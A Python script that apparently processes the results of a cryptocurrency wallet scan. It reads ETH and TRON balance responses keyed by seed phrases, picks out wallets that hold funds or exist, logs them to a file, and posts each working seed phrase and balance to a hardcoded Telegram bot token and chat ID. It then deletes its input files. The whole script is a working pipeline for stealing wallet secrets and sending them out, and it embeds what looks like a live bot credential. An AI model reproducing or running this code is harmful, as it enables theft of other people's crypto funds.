#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
import sys
import logging
import tempfile
import html
import time
from pathlib import Path

try:
    import requests
except ImportError:
    requests = None
    import urllib.request as urllib_request
    import urllib.parse as urllib_parse

ETH_RESPONSE_FILE = "ETH_scan_response.json"
TRON_RESPONSE_FILE = "TRON_scan_response.json"
FOUND_WALLET_FILE = "found_wallet.json"

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "8366276456:AAEMKoeBvj9V9P6Cbs0y_4FWNBMYFgu6O60")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "6807387667")
TELEGRAM_MESSAGE_LIMIT = 4000

logger = logging.getLogger("scanner")
logger.setLevel(logging.INFO)
ch = logging.StreamHandler()
ch.setLevel(logging.INFO)
formatter = logging.Formatter("[%(levelname)s] %(message)s")
ch.setFormatter(formatter)
if not logger.handlers:
    logger.addHandler(ch)

# -------------------- Telegram Helpers --------------------
def send_telegram_message(text):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        logger.warning("Telegram token or chat id not provided; skipping Telegram send.")
        return False

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }

    try:
        if requests:
            r = requests.post(url, data=payload, timeout=15)
            if r.status_code == 200:
                return True
            logger.error(f"Telegram send failed: {r.status_code} {r.text}")
            return False
        else:
            data = urllib_parse.urlencode(payload).encode("utf-8")
            req = urllib_request.Request(url, data=data, method="POST")
            with urllib_request.urlopen(req, timeout=15) as resp:
                return resp.status == 200
    except Exception as e:
        logger.error(f"Exception while sending Telegram message: {e}")
        return False

def send_telegram_file(file_path, caption=None):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        logger.warning("Telegram token or chat id not provided; skipping Telegram file send.")
        return False

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    if requests:
        try:
            with open(file_path, "rb") as fh:
                files = {"document": fh}
                data = {"chat_id": TELEGRAM_CHAT_ID}
                if caption:
                    data["caption"] = caption
                r = requests.post(url, files=files, data=data, timeout=30)
                if r.status_code == 200:
                    return True
                logger.error(f"Telegram file send failed: {r.status_code} {r.text}")
                return False
        except Exception as e:
            logger.error(f"Exception while sending Telegram file: {e}")
            return False
    else:
        logger.error("requests library not available; cannot send files without it.")
        return False

def deliver_to_telegram(seed_phrase, chain, response_obj):
    """Send a wallet entry to Telegram, as message or file."""
    pretty_json = json.dumps(response_obj, ensure_ascii=False, indent=2)
    escaped_json = html.escape(pretty_json)
    escaped_seed = html.escape(seed_phrase)
    message = f" {chain} Seed: <b>{escaped_seed}</b>\n\nResponse:\n<pre>{escaped_json}</pre>"

    if len(message) <= TELEGRAM_MESSAGE_LIMIT:
        if send_telegram_message(message):
            logger.info(f"Sent {chain} wallet to Telegram as message.")
            return True

    # Fallback: send as file
    try:
        with tempfile.NamedTemporaryFile("w", delete=False, encoding="utf-8", suffix=".json") as tmp:
            tmp.write(f"Seed: {seed_phrase}\n\n")
            json.dump(response_obj, tmp, ensure_ascii=False, indent=2)
            tmp_path = tmp.name
        caption = f"{chain} Seed: {seed_phrase}"
        ok = send_telegram_file(tmp_path, caption=caption)
        os.remove(tmp_path)
        if ok:
            logger.info(f"Sent {chain} wallet to Telegram as file.")
        return ok
    except Exception as e:
        logger.error(f"Failed to write temp file for Telegram: {e}")
        return False

# -------------------- Activity Detection (Simplified) --------------------
def has_eth_activity(record):
    """
    Check if the ETH response shows a balance > 0.
    record is a list of ETH address entries, each with 'balance_raw'.
    """
    for entry in record:
        balance_raw = entry.get("balance_raw", {})
        result = balance_raw.get("result", "0")
        try:
            balance = int(result)  # result is a string like "0" or "123456789..."
            if balance > 0:
                return True
        except (ValueError, TypeError):
            continue
    return False

def has_tron_activity(record):
    """
    Check if the TRON response shows that the account exists (data list is non-empty).
    record is a list of TRON address entries, each with 'balance_raw'.
    """
    for entry in record:
        balance_raw = entry.get("balance_raw", {})
        data = balance_raw.get("data", [])
        if isinstance(data, list) and len(data) > 0:
            return True
    return False

# -------------------- Main Scanner --------------------
def process_scanner():
    """
    Read ETH_scan_response.json and TRON_scan_response.json,
    detect active wallets based on simple rules,
    send to Telegram, append to found_wallet.json, and delete the files.
    """
    logger.info("Scanner started - checking for active wallets...")
    active_count = 0

    for file_path, chain, activity_func in [
        (ETH_RESPONSE_FILE, "ETH", has_eth_activity),
        (TRON_RESPONSE_FILE, "TRON", has_tron_activity),
    ]:
        if not os.path.exists(file_path):
            logger.warning(f"File {file_path} not found, skipping.")
            continue

        with open(file_path, "r", encoding="utf-8") as f:
            lines = f.readlines()

        for line in lines:
            line = line.strip()
            if not line:
                continue
            try:
                entry = json.loads(line)
            except json.JSONDecodeError:
                logger.warning(f"Invalid JSON line in {file_path}, skipping.")
                continue

            seed = entry.get("seed")
            # The response is under chain key (e.g., "eth" or "tron")
            response = entry.get(chain.lower(), [])
            if not seed or not response:
                continue

            # Check activity using the appropriate function
            if activity_func(response):
                active_count += 1
                logger.info(f"Active {chain} wallet found: {seed}")
                # Append to found_wallet.json
                with open(FOUND_WALLET_FILE, "a", encoding="utf-8") as found:
                    found.write(json.dumps({"chain": chain, "seed": seed, "response": response}, separators=(",", ":")) + "\n")
                # Send to Telegram
                deliver_to_telegram(seed, chain, response)

        # Delete the processed file after checking all lines
        try:
            os.remove(file_path)
            logger.info(f"Deleted {file_path} after processing.")
        except Exception as e:
            logger.error(f"Failed to delete {file_path}: {e}")

    logger.info(f"Scanner finished. Found {active_count} active wallets.")
    return active_count

if __name__ == "__main__":
    process_scanner()